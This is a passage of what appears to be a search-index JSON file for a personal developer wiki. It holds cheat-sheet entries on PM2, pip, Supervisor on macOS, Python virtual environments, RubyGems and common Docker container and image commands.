"development/node-npm/pm2/#auto-startup-pm2-on-raspberry-pi", "text": "When using PM2 on Raspberry Pi . You will encounter a problem when you try to start pm2 with the default command. sudo env PATH = $PATH :/usr/local/bin pm2 startup systemd -u pi --hp /home/pi", "title": "Auto Startup PM2 on Raspberry Pi"}, {"location": "development/node-npm/pm2/#updating-pm2", "text": "It's very useful to update PM2 to the latest version specially when you update your Node.js version. Since updating node usually will brake the pm2 process to function properly, you can use the following command to update PM2: npm install pm2@latest -g Then update the in-memory PM2: pm2 update You can also create a alias to update PM2 with one command: alias pm2update = 'npm install pm2@latest -g && pm2 update && pm2 save'", "title": "Updating PM2"}, {"location": "development/python/pip/", "tags": ["python", "pip", "package-manager", "cheat-sheet"], "text": "Pip Python Package Manager Cheat Sheet \u00b6 Pip is the package installer for Python. You can use it to install packages from the Python Package Index and other indexes. List Installed Packages With Pip \u00b6 pip list List Outdated Packages \u00b6 pip list --outdated Instal Or Update Package To Specific Version \u00b6 exmaple with MySQL_python package: pip install MySQL_python == 1 .2.2 Update Package To The Latest Avalable Version \u00b6 exmaple with MySQL_python package: pip install MySQL_python --upgrade Update Pip Itself \u00b6 pip install --upgrade pip Update All Packages Installed With Pip \u00b6 pip list --outdated --format = freeze | grep -v '^\\-e' | cut -d = -f 1 | xargs -n1 pip install -U Generate requirements.txt For a Project \u00b6 Run this command at terminal at the root of the project: pip freeze > requirements.txt", "title": "Pip Package Manager"}, {"location": "development/python/pip/#pip-python-package-manager-cheat-sheet", "text": "Pip is the package installer for Python. You can use it to install packages from the Python Package Index and other indexes.", "title": "Pip Python Package Manager Cheat Sheet"}, {"location": "development/python/pip/#list-installed-packages-with-pip", "text": "pip list", "title": "List Installed Packages With Pip"}, {"location": "development/python/pip/#list-outdated-packages", "text": "pip list --outdated", "title": "List Outdated Packages"}, {"location": "development/python/pip/#instal-or-update-package-to-specific-version", "text": "exmaple with MySQL_python package: pip install MySQL_python == 1 .2.2", "title": "Instal Or Update Package To Specific Version"}, {"location": "development/python/pip/#update-package-to-the-latest-avalable-version", "text": "exmaple with MySQL_python package: pip install MySQL_python --upgrade", "title": "Update Package To The Latest Avalable Version"}, {"location": "development/python/pip/#update-pip-itself", "text": "pip install --upgrade pip", "title": "Update Pip Itself"}, {"location": "development/python/pip/#update-all-packages-installed-with-pip", "text": "pip list --outdated --format = freeze | grep -v '^\\-e' | cut -d = -f 1 | xargs -n1 pip install -U", "title": "Update All Packages Installed With Pip"}, {"location": "development/python/pip/#generate-requirementstxt-for-a-project", "text": "Run this command at terminal at the root of the project: pip freeze > requirements.txt", "title": "Generate requirements.txt For a Project"}, {"location": "development/python/supervisor/", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"], "text": "Supervisor Python Processes Management \u00b6 Supervisor is a client/server system that allows its users to monitor and control a number of processes on UNIX-like operating systems. Official Supervisord Docs . Example of Supervisord Web UI listening on localhost:9999 Tips of Supervisor Usage \u00b6 Seeing all child processes running supervisorctl -c /path/to/supervisord.conf I find it helpful to create an alias in my bash profile for those 2 commands above so that I don't have to manually type -c all the time Example: echo \"alias supervisord='supervisord -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf'\" echo \"alias supervisorctl='supervisorctl -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf'\" List All Processes \u00b6 You need to provide the path to the supervisor configuration file with - -c /path/to/supervisord.conf supervisorctl -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf Reload Changes from Config File to Supervisor \u00b6 supervisorctl reread Update Supervisor Configuration \u00b6 supervisorctl update MacOS Supervisor Installation \u00b6 Install with pip as system package: brew install supervisor The default location of the supervisor configuration file is at /System/Volumes/Data/opt/homebrew/etc/supervisord.conf . You can use a symbolic link to the configuration file to make it persistent. For example, you can move the configuration file to Dropbox folder and use a symbolic link to it. Link the configuration file to the Dropbox folder: rm -rf /System/Volumes/Data/opt/homebrew/etc/supervisord.conf ln -s /Users/fire1ce/Dropbox/SettingsConfigs/supervisor/supervisord.conf /System/Volumes/Data/opt/homebrew/etc/supervisord.conf Start Supervisor Service on Boot \u00b6 In order to start the supervisor service on boot, we need to create a service file for MacOS. sudo nano /Library/LaunchDaemons/com.agendaless.supervisord.plist Append the following content to the file: <!-- /Library/LaunchDaemons/com.agendaless.supervisord.plist --> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version= \"1.0\" > <dict> <key> KeepAlive </key> <dict> <key> SuccessfulExit </key> <false/> </dict> <key> Label </key> <string> com.agendaless.supervisord </string> <key> ProgramArguments </key> <array> <string> /opt/homebrew/bin/supervisord </string> <string> -n </string> <string> -c </string> <string> /System/Volumes/Data/opt/homebrew/etc/supervisord.conf </string> </array> <key> RunAtLoad </key> <true/> </dict> </plist> Supervisor Configuration File Example With 2 Managed Processes: \u00b6 [ unix_http_server ] file=/opt/homebrew/var/run/supervisor.sock # the path to the socket file [ inet_http_server ] # inet (TCP) server disabled by default port=127.0.0.1:9999 # ip_address:port specifier, *:port for all iface # username=user # default is no username (open server) # password=123 default is no password (open server) [ supervisord ] logfile=/opt/homebrew/var/log/supervisord.log # main log file# default $CWD/supervisord.log logfile_maxbytes=50MB # max main logfile bytes b4 rotation# default 50MB logfile_backups=10 # # of main logfile backups# 0 means none, default 10 loglevel=info # log level# default info# others: debug,warn,trace pidfile=/opt/homebrew/var/run/supervisord.pid # supervisord pidfile# default supervisord.pid nodaemon=false # start in foreground if true# default false silent=false # no logs to stdout if true# default false minfds=1024 # min. avail startup file descriptors# default 1024 minprocs=200 # min. avail process descriptors#default 200 [ rpcinterface : supervisor ] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///opt/homebrew/var/run/supervisor.sock [include] files = /opt/homebrew/etc/supervisor.d/*.ini [program:macos-bt-connect-based-on-ip] command=/Users/fire1ce/.pyenv/versions/macos-bt-connect-based-on-ip/bin/python /Users/fire1ce/projects/macos-bt-connect-based-on-ip/macos-bt-connect-based-on-ip.py directory=/Users/fire1ce/projects/macos-bt-connect-based-on-ip user=fire1ce autostart=true autorestart=true startsecs=2 startretries=3 stdout_logfile=/opt/homebrew/var/log/macos-bt-connect-based-on-ip.out.log stdout_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stdout_logfile_backups=5 # # of stdout logfile backups (0 means none, default 10) stderr_logfile=/opt/homebrew/var/log/macos-bt-connect-based-on-ip.err.log stderr_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stderr_logfile_backups=5 # # of stderr logfile backups (0 means none, default 10) [ program : macos-screenlock-api ] command=/Users/fire1ce/.pyenv/versions/macos-screenlock-api/bin/python /Users/fire1ce/projects/macos-screenlock-api/macos-screenlock-api.py directory=/Users/fire1ce/projects/macos-screenlock-api user=fire1ce autostart=true autorestart=true startsecs=2 startretries=3 stdout_logfile=/opt/homebrew/var/log/macos-screenlock-api.out.log stdout_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stdout_logfile_backups=5 # # of stdout logfile backups (0 means none, default 10) stderr_logfile=/opt/homebrew/var/log/macos-screenlock-api.err.log stderr_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stderr_logfile_backups=5 # # of stderr logfile backups (0 means none, default 10)", "title": "Supervisor Process Manager"}, {"location": "development/python/supervisor/#supervisor-python-processes-management", "text": "Supervisor is a client/server system that allows its users to monitor and control a number of processes on UNIX-like operating systems. Official Supervisord Docs . Example of Supervisord Web UI listening on localhost:9999", "title": "Supervisor Python Processes Management"}, {"location": "development/python/supervisor/#tips-of-supervisor-usage", "text": "Seeing all child processes running supervisorctl -c /path/to/supervisord.conf I find it helpful to create an alias in my bash profile for those 2 commands above so that I don't have to manually type -c all the time Example: echo \"alias supervisord='supervisord -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf'\" echo \"alias supervisorctl='supervisorctl -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf'\"", "title": "Tips of Supervisor Usage"}, {"location": "development/python/supervisor/#list-all-processes", "text": "You need to provide the path to the supervisor configuration file with - -c /path/to/supervisord.conf supervisorctl -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf", "title": "List All Processes"}, {"location": "development/python/supervisor/#reload-changes-from-config-file-to-supervisor", "text": "supervisorctl reread", "title": "Reload Changes from Config File to Supervisor"}, {"location": "development/python/supervisor/#update-supervisor-configuration", "text": "supervisorctl update", "title": "Update Supervisor Configuration"}, {"location": "development/python/supervisor/#macos-supervisor-installation", "text": "Install with pip as system package: brew install supervisor The default location of the supervisor configuration file is at /System/Volumes/Data/opt/homebrew/etc/supervisord.conf . You can use a symbolic link to the configuration file to make it persistent. For example, you can move the configuration file to Dropbox folder and use a symbolic link to it. Link the configuration file to the Dropbox folder: rm -rf /System/Volumes/Data/opt/homebrew/etc/supervisord.conf ln -s /Users/fire1ce/Dropbox/SettingsConfigs/supervisor/supervisord.conf /System/Volumes/Data/opt/homebrew/etc/supervisord.conf", "title": "MacOS Supervisor Installation"}, {"location": "development/python/supervisor/#start-supervisor-service-on-boot", "text": "In order to start the supervisor service on boot, we need to create a service file for MacOS. sudo nano /Library/LaunchDaemons/com.agendaless.supervisord.plist Append the following content to the file: <!-- /Library/LaunchDaemons/com.agendaless.supervisord.plist --> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version= \"1.0\" > <dict> <key> KeepAlive </key> <dict> <key> SuccessfulExit </key> <false/> </dict> <key> Label </key> <string> com.agendaless.supervisord </string> <key> ProgramArguments </key> <array> <string> /opt/homebrew/bin/supervisord </string> <string> -n </string> <string> -c </string> <string> /System/Volumes/Data/opt/homebrew/etc/supervisord.conf </string> </array> <key> RunAtLoad </key> <true/> </dict> </plist>", "title": "Start Supervisor Service on Boot"}, {"location": "development/python/supervisor/#supervisor-configuration-file-example-with-2-managed-processes", "text": "[ unix_http_server ] file=/opt/homebrew/var/run/supervisor.sock # the path to the socket file [ inet_http_server ] # inet (TCP) server disabled by default port=127.0.0.1:9999 # ip_address:port specifier, *:port for all iface # username=user # default is no username (open server) # password=123 default is no password (open server) [ supervisord ] logfile=/opt/homebrew/var/log/supervisord.log # main log file# default $CWD/supervisord.log logfile_maxbytes=50MB # max main logfile bytes b4 rotation# default 50MB logfile_backups=10 # # of main logfile backups# 0 means none, default 10 loglevel=info # log level# default info# others: debug,warn,trace pidfile=/opt/homebrew/var/run/supervisord.pid # supervisord pidfile# default supervisord.pid nodaemon=false # start in foreground if true# default false silent=false # no logs to stdout if true# default false minfds=1024 # min. avail startup file descriptors# default 1024 minprocs=200 # min. avail process descriptors#default 200 [ rpcinterface : supervisor ] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///opt/homebrew/var/run/supervisor.sock [include] files = /opt/homebrew/etc/supervisor.d/*.ini [program:macos-bt-connect-based-on-ip] command=/Users/fire1ce/.pyenv/versions/macos-bt-connect-based-on-ip/bin/python /Users/fire1ce/projects/macos-bt-connect-based-on-ip/macos-bt-connect-based-on-ip.py directory=/Users/fire1ce/projects/macos-bt-connect-based-on-ip user=fire1ce autostart=true autorestart=true startsecs=2 startretries=3 stdout_logfile=/opt/homebrew/var/log/macos-bt-connect-based-on-ip.out.log stdout_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stdout_logfile_backups=5 # # of stdout logfile backups (0 means none, default 10) stderr_logfile=/opt/homebrew/var/log/macos-bt-connect-based-on-ip.err.log stderr_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stderr_logfile_backups=5 # # of stderr logfile backups (0 means none, default 10) [ program : macos-screenlock-api ] command=/Users/fire1ce/.pyenv/versions/macos-screenlock-api/bin/python /Users/fire1ce/projects/macos-screenlock-api/macos-screenlock-api.py directory=/Users/fire1ce/projects/macos-screenlock-api user=fire1ce autostart=true autorestart=true startsecs=2 startretries=3 stdout_logfile=/opt/homebrew/var/log/macos-screenlock-api.out.log stdout_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stdout_logfile_backups=5 # # of stdout logfile backups (0 means none, default 10) stderr_logfile=/opt/homebrew/var/log/macos-screenlock-api.err.log stderr_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB) stderr_logfile_backups=5 # # of stderr logfile backups (0 means none, default 10)", "title": "Supervisor Configuration File Example With 2 Managed Processes:"}, {"location": "development/python/virtualenv/", "tags": ["python", "venv", "cheat-sheet"], "text": "Python Virtual Environment \u00b6 About Python Virtual Environment - venv \u00b6 venv is a tool to create isolated Python environments. Since Python 3.3, a subset of it has been integrated into the standard library under the venv module. Using venv is very useful for creating isolated Python environments for your project,it will allow you installing Python packages and modules in a separate location from the rest of your host os without conflicting versions. Install venv \u00b6 In order to install venv , we need to install the following packages: sudo apt install python3-venv Initialization of a Virtual Environment \u00b6 Go to the root destination of your project and run the following command: python3 -m venv .venv This will create a virtual environment in the current directory. The virtual environment folder will be named .venv . Activation of a Virtual Environment \u00b6 In order to activate a virtual environment, from the root directory of your project, run the following command: source .venv/bin/activate Check if the virtual environment is activated by running the following command: which python The output should be with ../.venv/bin/python as the output. Bonus: You can add an alias to your bash profile to make it easier to activate the virtual environment: alias activate = 'source .venv/bin/activate' Deactivation of a Virtual Environment \u00b6 When you are done with the virtual environment, you can deactivate it by running the following command: deactivate", "title": "Virtual Environment"}, {"location": "development/python/virtualenv/#python-virtual-environment", "text": "", "title": "Python Virtual Environment"}, {"location": "development/python/virtualenv/#about-python-virtual-environment-venv", "text": "venv is a tool to create isolated Python environments. Since Python 3.3, a subset of it has been integrated into the standard library under the venv module. Using venv is very useful for creating isolated Python environments for your project,it will allow you installing Python packages and modules in a separate location from the rest of your host os without conflicting versions.", "title": "About Python Virtual Environment - venv"}, {"location": "development/python/virtualenv/#install-venv", "text": "In order to install venv , we need to install the following packages: sudo apt install python3-venv", "title": "Install venv"}, {"location": "development/python/virtualenv/#initialization-of-a-virtual-environment", "text": "Go to the root destination of your project and run the following command: python3 -m venv .venv This will create a virtual environment in the current directory. The virtual environment folder will be named .venv .", "title": "Initialization of a Virtual Environment"}, {"location": "development/python/virtualenv/#activation-of-a-virtual-environment", "text": "In order to activate a virtual environment, from the root directory of your project, run the following command: source .venv/bin/activate Check if the virtual environment is activated by running the following command: which python The output should be with ../.venv/bin/python as the output. Bonus: You can add an alias to your bash profile to make it easier to activate the virtual environment: alias activate = 'source .venv/bin/activate'", "title": "Activation of a Virtual Environment"}, {"location": "development/python/virtualenv/#deactivation-of-a-virtual-environment", "text": "When you are done with the virtual environment, you can deactivate it by running the following command: deactivate", "title": "Deactivation of a Virtual Environment"}, {"location": "development/ruby/ruby/", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"], "text": "Ruby Gem Package Manager \u00b6 RubyGems is a package manager for the Ruby programming language that provides a standard format for distributing Ruby programs and libraries (in a self-contained format called a \"gem\"), a tool designed to easily manage the installation of gems, and a server for distributing them. Finding Installed And Available Gems \u00b6 gem list Installing New Gems \u00b6 gem install rails_utils Removing / Deleting Gems \u00b6 gem uninstall rails_utils Finding Outdated Gems \u00b6 gem outdated Get Gem & Ruby Environment Information \u00b6 gem environment Update All the Gems \u00b6 Install rubygems-update gem install rubygems-update Then run: gem update --system update_rubygems Reading The Gem Documentation \u00b6 One of the most handy and important things about gems is that they [should] come with good documentation to allow you to start working with them fast. The simplest way to go with documentation is to run a local server where you will have access to all installed gems\u2019 usage instructions. Run the following to run a documentation server: gem server it will start a server on port 8808. # Server started at http://0.0.0.0:8808", "title": "Ruby Gem Package Manager"}, {"location": "development/ruby/ruby/#ruby-gem-package-manager", "text": "RubyGems is a package manager for the Ruby programming language that provides a standard format for distributing Ruby programs and libraries (in a self-contained format called a \"gem\"), a tool designed to easily manage the installation of gems, and a server for distributing them.", "title": "Ruby Gem Package Manager"}, {"location": "development/ruby/ruby/#finding-installed-and-available-gems", "text": "gem list", "title": "Finding Installed And Available Gems"}, {"location": "development/ruby/ruby/#installing-new-gems", "text": "gem install rails_utils", "title": "Installing New Gems"}, {"location": "development/ruby/ruby/#removing-deleting-gems", "text": "gem uninstall rails_utils", "title": "Removing / Deleting Gems"}, {"location": "development/ruby/ruby/#finding-outdated-gems", "text": "gem outdated", "title": "Finding Outdated Gems"}, {"location": "development/ruby/ruby/#get-gem-ruby-environment-information", "text": "gem environment", "title": "Get Gem &amp; Ruby Environment Information"}, {"location": "development/ruby/ruby/#update-all-the-gems", "text": "Install rubygems-update gem install rubygems-update Then run: gem update --system update_rubygems", "title": "Update All the Gems"}, {"location": "development/ruby/ruby/#reading-the-gem-documentation", "text": "One of the most handy and important things about gems is that they [should] come with good documentation to allow you to start working with them fast. The simplest way to go with documentation is to run a local server where you will have access to all installed gems\u2019 usage instructions. Run the following to run a documentation server: gem server it will start a server on port 8808. # Server started at http://0.0.0.0:8808", "title": "Reading The Gem Documentation"}, {"location": "devops/docker/common-docker-commands/", "tags": ["docker", "cheat-sheet"], "text": "Common Docker Commands \u00b6 This is a short summary of the most commonly used Docker commands. If you're new to Docker, or even experienced Docker, it can be helpful to have a quick reference to the most commonly used Docker commands for managing the Docker environment. Show all Containers Including Running and Stopped \u00b6 docker ps -a Show Docker Container Logs \u00b6 docker logs <container_id> Get Into Container Shell \u00b6 docker exec -it <container_id> /bin/bash or docker exec -it <container_id> /bin/sh Stoping Containers \u00b6 docker stop <container_id> foce stop with kill docker kill <container_id> Removing Containers \u00b6 docker rm <container_id> force remove docker rm -f <container_id> Find Container IP Address \u00b6 docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container name/id> Copy Files into Docker Container \u00b6 docker cp < local file> <container name/id>:<remote file> Copy Files from Docker Container \u00b6 docker cp <container name/id>:<remote file> < local file> Purging \u00b6 Purging All Unused or Dangling Images, Containers, Volumes, and Networks Docker provides a single command that will clean up any resources \u2014 images, containers, volumes, and networks \u2014 that are dangling (not associated with a container): docker system prune To additionally remove any stopped containers and all unused images (not just dangling images), add the -a flag to the command: docker system prune -a Monitor System Resource Utilization for Running Containers \u00b6 To check the CPU, memory, and network I/O usage of a single container, you can use: docker stats <container> For all containers listed by ID: docker stats $( docker ps -q ) For all containers listed by name: docker stats $( docker ps --format '{{.Names}}' ) For all containers listed by image: docker ps -a -f ancestor = ubuntu Remove all untagged images: docker rmi $( docker images | grep \u201c^\u201d | awk '{split($0,a,\" \"); print a[3]}' ) Remove container by a regular expression: docker ps -a | grep wildfly | awk '{print $1}' | xargs docker rm -f Remove all exited containers: docker rm -f $( docker ps -a | grep Exit | awk '{ print $1 }' ) Credit \u00b6 Thanks to @wsargent for creating this cheat sheet.", "title": "Common Docker Commands"}, {"location": "devops/docker/common-docker-commands/#common-docker-commands", "text": "This is a short summary of the most commonly used Docker commands. If you're new to Docker, or even experienced Docker, it can be helpful to have a quick reference to the most commonly used Docker commands for managing the Docker environment.", "title": "Common Docker Commands"}, {"location": "devops/docker/common-docker-commands/#show-all-containers-including-running-and-stopped", "text": "docker ps -a", "title": "Show all Containers Including Running and Stopped"}, {"location": "devops/docker/common-docker-commands/#show-docker-container-logs", "text": "docker logs <container_id>", "title": "Show Docker Container Logs"}, {"location": "devops/docker/common-docker-commands/#get-into-container-shell", "text": "docker exec -it <container_id> /bin/bash or docker exec -it <container_id> /bin/sh", "title": "Get Into Container Shell"}, {"location": "devops/docker/common-docker-commands/#stoping-containers", "text": "docker stop <container_id> foce stop with kill docker kill <container_id>", "title": "Stoping Containers"}, {"location": "devops/docker/common-docker-commands/#removing-containers", "text": "docker rm <container_id> force remove docker rm -f <container_id>", "title": "Removing Containers"}, {"location": "devops/docker/common-docker-commands/#find-container-ip-address", "text": "docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container name/id>", "title": "Find Container IP Address"}, {"location": "devops/docker/common-docker-commands/#copy-files-into-docker-container", "text": "docker cp < local file> <container name/id>:<remote file>", "title": "Copy Files into Docker Container"}, {"location": "devops/docker/common-docker-commands/#copy-files-from-docker-container", "text": "docker cp <container name/id>:<remote file> < local file>", "title": "Copy Files from Docker Container"}, {"location": "devops/docker/common-docker-commands/#purging", "text": "Purging All Unused or Dangling Images, Containers, Volumes, and Networks Docker provides a single command that will clean up any resources \u2014 images, containers, volumes, and networks \u2014 that are dangling (not associated with a container): docker system prune To additionally remove any stopped containers and all unused images (not just dangling images), add the -a flag to the command: docker system prune -a", "title": "Purging"}, {"location": "devops/docker/common-docker-commands/#monitor-system-resource-utilization-for-running-containers", "text": "To check the CPU, memory, and network I/O usage of a single container, you can use: docker stats <container> For all containers listed by ID: docker stats $( docker ps -q ) For all containers listed by name: docker stats $( docker ps --format '{{.Names}}' ) For all containers listed by image: docker ps -a -f ancestor = ubuntu Remove all untagged images: docker rmi $( docker images | grep \u201c^\u201d | awk '{split($0,a,\" \"); print a[3]}' ) Remove container by a regular expression: docker ps -a | grep wildfly | awk '{print $1}' | xargs docker rm -f Remove all exited containers: docker rm -f $( docker ps -a | grep Exit | awk '{ print $1 }' )", "title": "Monitor System Resource Utilization for Running Containers"}, {"location": "devops/docker/common-docker-commands/#credit", "text": "Thanks to @wsargent for creating this cheat sheet.", "title": "Credit"}, {"location": "devops/docker/docker-containers/", "tags": ["docker", "cheat-sheet"], "text": "Docker Containers Cheat Sheet \u00b6 What's a Docker Container? \u00b6 A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings. Containers \u00b6 Your basic isolated Docker process . Containers are to Virtual Machines as threads are to processes. Or you can think of them as chroots on steroids. Lifecycle \u00b6 docker create creates a container but does not start it. docker rename allows the container to be renamed. docker run creates and starts a container in one operation. docker rm deletes a container. docker update updates a container's resource limits. Normally if you run a container without options it will start and stop immediately, if you want keep it running you can use the command, docker run -td container_id this will use the option -t that will allocate a pseudo-TTY session and -d that will detach automatically the container (run container in background and print container ID). If you want a transient container, docker run --rm will remove the container after it stops. If you want to map a directory on the host to a docker container, docker run -v $HOSTDIR:$DOCKERDIR . Also see Volumes . If you want to remove also the volumes associated with the container, the deletion of the container must include the -v switch like in docker rm -v . There's also a logging driver available for individual containers in docker 1.10. To run docker with a custom log driver (i.e., to syslog), use docker run --log-driver=syslog . Another useful option is docker run --name yourname docker_image because when you specify the --name inside the run command this will allow you to start and stop a container by calling it with the name the you specified when you created it. Starting and Stopping \u00b6 docker start starts a container so it is running. docker stop stops a running container. docker restart stops and starts a container. docker pause pauses a running container, \"freezing\" it in place. docker unpause will unpause a running container. docker wait blocks until running container stops. docker kill sends a SIGKILL to a running container. docker attach will connect to a running container. If you want to detach from a running container, use Ctrl + p, Ctrl + q . If you want to integrate a container with a host process manager , start the daemon with -r=false then use docker start -a . If you want to expose container ports through the host, see the exposing ports section. Restart policies on crashed docker instances are covered here . CPU Constraints \u00b6 You can limit CPU, either using a percentage of all CPUs, or by using specific cores. For example, you can tell the cpu-shares setting. The setting is a bit strange -- 1024 means 100% of the CPU, so if you want the container to take 50% of all CPU cores, you should specify 512. See https://goldmann.pl/blog/2014/09/11/resource-management-in-docker/#_cpu for more: docker run -it -c 512 agileek/cpuset-test You can also only use some CPU cores using cpuset-cpus . See https://agileek.github.io/docker/2014/08/06/docker-cpuset/ for details and some nice videos: docker run -it --cpuset-cpus = 0 ,4,6 agileek/cpuset-test Note that Docker can still see all of the CPUs inside the container -- it just isn't using all of them. See https://github.com/docker/docker/issues/20770 for more details. Memory Constraints \u00b6 You can also set memory constraints on Docker: docker run -it -m 300M ubuntu:14.04 /bin/bash Capabilities \u00b6 Linux capabilities can be set by using cap-add and cap-drop . See https://docs.docker.com/engine/reference/run/#/runtime-privilege-and-linux-capabilities for details. This should be used for greater security. To mount a FUSE based filesystem, you need to combine both --cap-add and --device: docker run --rm -it --cap-add SYS_ADMIN --device /dev/fuse sshfs Give access to a single device: docker run -it --device = /dev/ttyUSB0 debian bash Give access to all devices: docker run -it --privileged -v /dev/bus/usb:/dev/bus/usb debian bash More info about privileged containers here . Info \u00b6 docker ps shows running containers. docker logs gets logs from container. (You can use a custom log driver, but logs is only available for json-file and journald in 1.10). docker inspect looks at all the info on a container (including IP address). docker events gets events from container. docker port shows public facing port of container. docker top shows running processes in container. docker stats shows containers' resource usage statistics. docker diff shows changed files in the container's FS. docker ps -a shows running and stopped containers. docker stats --all shows a list of all containers, default shows just running. Import / Export \u00b6 docker cp copies files or folders between a container and the local filesystem. docker export turns container filesystem into tarball archive stream to STDOUT. Executing Commands \u00b6 docker exec to execute a command in container. To enter a running container, attach a new shell process to a running container called foo, use: docker exec -it foo /bin/bash . Credit \u00b6 Thanks to @wsargent for creating this cheat sheet.", "title": "Containers Cheat Sheet"}, {"location": "devops/docker/docker-containers/#docker-containers-cheat-sheet", "text": "", "title": "Docker Containers Cheat Sheet"}, {"location": "devops/docker/docker-containers/#whats-a-docker-container", "text": "A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.", "title": "What's a Docker Container?"}, {"location": "devops/docker/docker-containers/#containers", "text": "Your basic isolated Docker process . Containers are to Virtual Machines as threads are to processes. Or you can think of them as chroots on steroids.", "title": "Containers"}, {"location": "devops/docker/docker-containers/#lifecycle", "text": "docker create creates a container but does not start it. docker rename allows the container to be renamed. docker run creates and starts a container in one operation. docker rm deletes a container. docker update updates a container's resource limits. Normally if you run a container without options it will start and stop immediately, if you want keep it running you can use the command, docker run -td container_id this will use the option -t that will allocate a pseudo-TTY session and -d that will detach automatically the container (run container in background and print container ID). If you want a transient container, docker run --rm will remove the container after it stops. If you want to map a directory on the host to a docker container, docker run -v $HOSTDIR:$DOCKERDIR . Also see Volumes . If you want to remove also the volumes associated with the container, the deletion of the container must include the -v switch like in docker rm -v . There's also a logging driver available for individual containers in docker 1.10. To run docker with a custom log driver (i.e., to syslog), use docker run --log-driver=syslog . Another useful option is docker run --name yourname docker_image because when you specify the --name inside the run command this will allow you to start and stop a container by calling it with the name the you specified when you created it.", "title": "Lifecycle"}, {"location": "devops/docker/docker-containers/#starting-and-stopping", "text": "docker start starts a container so it is running. docker stop stops a running container. docker restart stops and starts a container. docker pause pauses a running container, \"freezing\" it in place. docker unpause will unpause a running container. docker wait blocks until running container stops. docker kill sends a SIGKILL to a running container. docker attach will connect to a running container. If you want to detach from a running container, use Ctrl + p, Ctrl + q . If you want to integrate a container with a host process manager , start the daemon with -r=false then use docker start -a . If you want to expose container ports through the host, see the exposing ports section. Restart policies on crashed docker instances are covered here .", "title": "Starting and Stopping"}, {"location": "devops/docker/docker-containers/#info", "text": "docker ps shows running containers. docker logs gets logs from container. (You can use a custom log driver, but logs is only available for json-file and journald in 1.10). docker inspect looks at all the info on a container (including IP address). docker events gets events from container. docker port shows public facing port of container. docker top shows running processes in container. docker stats shows containers' resource usage statistics. docker diff shows changed files in the container's FS. docker ps -a shows running and stopped containers. docker stats --all shows a list of all containers, default shows just running.", "title": "Info"}, {"location": "devops/docker/docker-containers/#import-export", "text": "docker cp copies files or folders between a container and the local filesystem. docker export turns container filesystem into tarball archive stream to STDOUT.", "title": "Import / Export"}, {"location": "devops/docker/docker-containers/#executing-commands", "text": "docker exec to execute a command in container. To enter a running container, attach a new shell process to a running container called foo, use: docker exec -it foo /bin/bash .", "title": "Executing Commands"}, {"location": "devops/docker/docker-containers/#credit", "text": "Thanks to @wsargent for creating this cheat sheet.", "title": "Credit"}, {"location": "devops/docker/docker-images/", "tags": ["docker", "cheat-sheet"], "text": "Docker Images Cheat Sheet \u00b6 What's a Docker Image? \u00b6 A Docker image is a file used to execute code in a Docker container. Docker images act as a set of instructions to build a Docker container, like a template. Docker images also act as the starting point when using Docker. An image is comparable to a snapshot in virtual machine (VM) environments. Images \u00b6 Images are just templates for docker containers . Lifecycle \u00b6 docker images shows all images. docker import creates an image from a tarball. docker build creates image from Dockerfile. docker commit creates image from a container, pausing it temporarily if it is running. docker rmi removes an image. docker load loads an image from a tar archive as STDIN, including images and tags (as of 0.7). docker save saves an image to a tar archive stream to STDOUT with all parent layers, tags & versions (as of 0.7). Info \u00b6 docker history shows history of image. docker tag tags an image to a name (local or registry). Cleaning up \u00b6 While you can use the docker rmi command to remove specific images, there's a tool called docker-gc that will safely clean up images that are no longer used by any containers. As of docker 1.13, docker image prune is also available for removing unused images. See Prune . Load/Save image \u00b6 Load an image from file: docker load < my_image.tar.gz Save an existing image: docker save my_image:my_tag | gzip > my_image.tar.gz Import/Export container \u00b6 Import a container as an image from file: cat my_container.tar.gz | docker import - my_image:my_tag Export an existing container: docker export my_container | gzip > my_container.tar.gz Difference between loading a saved image and importing an exported container as an image \u00b6 Loading an image using the load command creates a new image including its history. Importing a container as an image using the import command creates a new image excluding the history which results in a smaller image size compared to loading an image. Credit \u00b6 Thanks to @wsargent for creating this cheat sheet.", "title": "Images Cheat Sheet"}, {"location": "devops/docker/docker-images/#docker-images-cheat-sheet", "text": "", "title": "Docker Images Cheat Sheet"}, {"location": "devops/docker/docker-images/#whats-a-docker-image", "text": "A Docker image is a file used to execute code in a Docker container. Docker images act as a set of instructions to build a Docker container, like a template. Docker images also act as the starting point when using Docker. An image is comparable to a snapshot in virtual machine (VM) environments.", "title": "What's a Docker Image?"}, {"location": "devops/docker/docker-images/#images", "text": "Images are just templates for docker containers .", "title": "Images"}, {"location": "devops/docker/docker-images/#lifecycle", "text": "docker images shows all images. docker import creates an image from a tarball. docker build creates image from Dockerfile. docker commit creates image from a container, pausing it 